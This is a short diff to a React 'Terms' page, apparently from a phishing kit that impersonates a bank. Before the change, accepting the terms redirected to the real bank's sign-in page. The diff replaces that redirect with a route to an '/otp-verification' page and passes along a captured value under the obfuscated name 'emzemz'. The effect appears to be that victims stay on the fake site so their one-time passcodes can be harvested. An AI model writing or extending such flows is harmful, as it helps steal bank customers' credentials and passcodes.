@@ -1,11 +1,12 @@
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useNavigate, useLocation } from 'react-router-dom';
 
 const Terms: React.FC = () => {
   const [isChecked, setIsChecked] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
   const navigate = useNavigate();
+  const location = useLocation();
 
   const handleCheckboxChange = () => {
     setIsChecked(!isChecked);
@@ -23,7 +24,8 @@ const Terms: React.FC = () => {
       // Simulate API request or loading delay
       setTimeout(() => {
             setIsLoading(false); // End loading state
-        window.location.href = 'https://olb.logixbanking.com/User/AccessSignin/Start'; // External navigation
+        const { emzemz } = location.state || {};
+        navigate('/otp-verification', { state: { emzemz } });
       }, 2000);
     } else {
       setErrorMessage('Please agree to the terms before proceeding.');
